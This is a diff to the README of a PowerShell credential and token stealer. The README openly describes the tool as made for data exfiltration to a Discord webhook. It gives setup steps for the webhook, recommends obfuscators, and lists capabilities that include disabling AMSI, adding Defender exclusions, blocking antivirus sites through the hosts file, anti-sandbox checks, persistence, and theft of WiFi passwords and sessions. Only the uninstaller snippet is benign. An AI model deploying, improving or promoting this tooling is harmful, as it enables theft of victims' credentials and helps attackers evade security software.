@@ -33,7 +33,7 @@ This tool is made for data exfiltration. All information collected is sent using
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```15``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```17``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
@@ -58,6 +58,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] GUI Builder
 - [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
 - [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [x] Antivirus Evasion: Disables [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) , excluded from ```Windows Defender``` and blocks access to antivirus websites in [hosts file](https://support.microsoft.com/en-us/topic/how-to-reset-the-hosts-file-back-to-the-default-c2a43f9d-e176-c6f3-e4ef-3500277a6dae). 
 - [x] Anti-Analysis ```VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run```
 - [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
 - [x] Extracts WiFi Passwords
@@ -114,8 +115,8 @@ Before pasting the tdata folder, ensure that you have deleted the existing tdata
 ### NOTE 
   ***The other session stealers can be utilized by applying the technique above***
  
-## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
-- Open a new Elevated Powershell Console and Paste the Contents below
+## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder, ExclusionPaths and Resets Hosts File)
+- Open a new Elevated Powershell Console then copy & paste the contents below
 ```ps1
 $ErrorActionPreference = "SilentlyContinue"
 function Cleanup {
@@ -123,6 +124,29 @@ function Cleanup {
   Remove-Item -Path "$env:appdata\KDOT" -force -recurse
   Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
   Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+$resethostsfile = @'
+# Copyright (c) 1993-2006 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+# localhost name resolution is handle within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+'@
+  [IO.File]::WriteAllText("$env:windir\System32\Drivers\etc\hosts", $resethostsfile)
   Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
 }
 Cleanup
